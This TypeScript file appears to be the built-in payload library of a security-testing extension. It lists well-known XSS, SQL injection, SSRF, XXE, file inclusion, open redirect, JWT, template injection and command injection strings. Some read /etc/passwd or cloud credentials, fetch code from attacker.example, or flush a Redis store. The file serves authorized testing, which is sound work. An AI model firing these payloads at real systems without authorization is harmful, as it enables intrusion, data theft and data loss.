// Built-in Payload Library — ships in the extension bundle so quick-insert
// works even when the Desktop Agent isn't running (see
// `apps/desktop/src-tauri/src/storage/repositories/payloads.rs`'s doc
// comment for the split between this static list and the "Custom
// Payloads" category, which does round-trip to the Bridge Server so it
// can sync across desktop + extension). Every entry here is a
// well-known, widely-published test string used for authorized security
// testing — nothing novel, nothing that isn't already in every public
// payload cheat sheet (PortSwigger, OWASP, PayloadsAllTheThings).

export interface BuiltinPayload {
  id: string;
  category: string;
  title: string;
  description: string;
  example: string;
}

export const PAYLOAD_CATEGORIES = [
  "XSS",
  "SQLi",
  "SSRF",
  "XXE",
  "LFI",
  "RFI",
  "Open Redirect",
  "JWT",
  "SSTI",
  "GraphQL",
  "Command Injection",
  "Template Injection",
] as const;

export const BUILTIN_PAYLOADS: BuiltinPayload[] = [
  { id: "xss-1", category: "XSS", title: "Basic alert", description: "Classic reflected/stored XSS probe", example: `<script>alert(document.domain)</script>` },
  { id: "xss-2", category: "XSS", title: "img onerror", description: "Bypasses naive <script> filters", example: `<img src=x onerror=alert(document.domain)>` },
  { id: "xss-3", category: "XSS", title: "svg onload", description: "Works when <img> is stripped", example: `<svg onload=alert(document.domain)>` },
  { id: "xss-4", category: "XSS", title: "javascript: URI", description: "For href/src sinks", example: `javascript:alert(document.domain)` },
  { id: "xss-5", category: "XSS", title: "Polyglot", description: "Fires across HTML/attr/JS contexts", example: `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */onerror=alert(document.domain) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(document.domain)//>\\x3e` },
  { id: "sqli-1", category: "SQLi", title: "Auth bypass (OR 1=1)", description: "Classic login-form bypass", example: `' OR '1'='1' -- -` },
  { id: "sqli-2", category: "SQLi", title: "UNION SELECT probe", description: "Column-count discovery", example: `' UNION SELECT NULL,NULL,NULL-- -` },
  { id: "sqli-3", category: "SQLi", title: "Time-based blind", description: "MySQL SLEEP-based confirmation", example: `' AND SLEEP(5)-- -` },
  { id: "sqli-4", category: "SQLi", title: "Error-based (MSSQL)", description: "Forces a type-conversion error to leak data", example: `' AND 1=CONVERT(int,(SELECT @@version))-- -` },
  { id: "ssrf-1", category: "SSRF", title: "AWS metadata endpoint", description: "Cloud metadata service probe", example: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` },
  { id: "ssrf-2", category: "SSRF", title: "Localhost bypass (decimal IP)", description: "Evades naive 127.0.0.1 string filters", example: `http://2130706433/` },
  { id: "ssrf-3", category: "SSRF", title: "Localhost bypass (IPv6)", description: "Evades naive IPv4-only filters", example: `http://[::1]/` },
  { id: "ssrf-4", category: "SSRF", title: "gopher:// smuggling", description: "For internal protocol smuggling via SSRF", example: `gopher://127.0.0.1:6379/_%0D%0AFLUSHALL%0D%0A` },
  { id: "xxe-1", category: "XXE", title: "Classic file read", description: "Reads /etc/passwd via an external entity", example: `<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>\n<r>&x;</r>` },
  { id: "xxe-2", category: "XXE", title: "Out-of-band (blind)", description: "For blind XXE via external DTD", example: `<?xml version="1.0"?>\n<!DOCTYPE r SYSTEM "http://attacker.example/evil.dtd">\n<r></r>` },
  { id: "lfi-1", category: "LFI", title: "Path traversal (passwd)", description: "Classic ../ traversal", example: `../../../../etc/passwd` },
  { id: "lfi-2", category: "LFI", title: "PHP filter wrapper", description: "Reads PHP source instead of executing it", example: `php://filter/convert.base64-encode/resource=index.php` },
  { id: "lfi-3", category: "LFI", title: "Null byte (legacy PHP)", description: "Legacy PHP <5.3.4 truncation bypass", example: `../../../../etc/passwd%00` },
  { id: "rfi-1", category: "RFI", title: "Remote include", description: "Classic RFI via attacker-controlled URL", example: `http://attacker.example/shell.txt?` },
  { id: "redirect-1", category: "Open Redirect", title: "Protocol-relative", description: "Evades relative-path-only allowlists", example: `//attacker.example` },
  { id: "redirect-2", category: "Open Redirect", title: "Backslash bypass", description: "Some parsers treat \\ as /", example: `/\\attacker.example` },
  { id: "redirect-3", category: "Open Redirect", title: "@ userinfo confusion", description: "Browsers may treat host before @ as userinfo", example: `https://trusted.example@attacker.example` },
  { id: "jwt-1", category: "JWT", title: "alg:none bypass", description: "Strips signature verification if the server accepts alg=none", example: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.` },
  { id: "jwt-2", category: "JWT", title: "HS256/RS256 confusion", description: "Sign with the server's known public key as an HMAC secret", example: `# header: {"alg":"HS256"} — sign payload with the RSA public key as the HMAC secret` },
  { id: "ssti-1", category: "SSTI", title: "Jinja2/Twig probe", description: "Math-expression evaluation confirms SSTI", example: `{{7*7}}` },
  { id: "ssti-2", category: "SSTI", title: "Jinja2 RCE", description: "Python object graph traversal RCE", example: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` },
  { id: "ssti-3", category: "SSTI", title: "Freemarker probe", description: "Java SSTI confirmation", example: `<#assign x=7*7>\${x}` },
  { id: "graphql-1", category: "GraphQL", title: "Introspection query", description: "Dumps the full schema if introspection is enabled", example: `{ __schema { types { name fields { name } } } }` },
  { id: "graphql-2", category: "GraphQL", title: "Batching / alias abuse", description: "Probes for missing rate limiting via aliased duplicate queries", example: `{ a: login(user:"admin",pass:"1"){token} b: login(user:"admin",pass:"2"){token} }` },
  { id: "cmdi-1", category: "Command Injection", title: "Basic chaining", description: "Unix command chaining probe", example: `; id` },
  { id: "cmdi-2", category: "Command Injection", title: "Subshell", description: "Backtick/subshell substitution", example: `$(id)` },
  { id: "cmdi-3", category: "Command Injection", title: "Blind (time-based)", description: "Confirms execution without direct output", example: `; sleep 5` },
  { id: "cmdi-4", category: "Command Injection", title: "Windows chaining", description: "cmd.exe command chaining probe", example: `& whoami` },
  { id: "tmpl-1", category: "Template Injection", title: "Handlebars probe", description: "Client-side template injection confirmation", example: `{{constructor.constructor('alert(1)')()}}` },
  { id: "tmpl-2", category: "Template Injection", title: "AngularJS sandbox escape", description: "Legacy AngularJS CSTI (<=1.5)", example: `{{constructor.constructor('alert(1)')()}}` },
];

export function payloadsByCategory(category: string): BuiltinPayload[] {
  return BUILTIN_PAYLOADS.filter((p) => p.category === category);
}
